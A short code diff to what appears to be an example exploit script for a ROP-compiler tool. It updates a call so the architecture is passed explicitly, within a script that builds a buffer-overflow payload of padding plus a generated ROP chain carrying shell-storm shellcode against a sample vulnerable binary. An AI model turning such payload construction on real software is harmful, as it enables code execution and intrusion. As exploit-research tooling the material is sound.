@@ -1,5 +1,6 @@
 import sys, logging, binascii
 from pwn import *
+import archinfo
 from rop_compiler import ropme, goal
 
 filename = './example/bof_read_got'
@@ -22,7 +23,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
 
 files = [(filename, 0)]
 goal_resolver = goal.create_from_arguments(files, ["/lib/x86_64-linux-gnu/libc.so.6"], [["shellcode_hex", binascii.hexlify(shellcode)]])
-rop = ropme.rop(files, goal_resolver, logging.CRITICAL)
+rop = ropme.rop(files, goal_resolver, archinfo.ArchAMD64, logging.CRITICAL)
 
 payload = 'A'*512 + 'B'*8 + rop
 
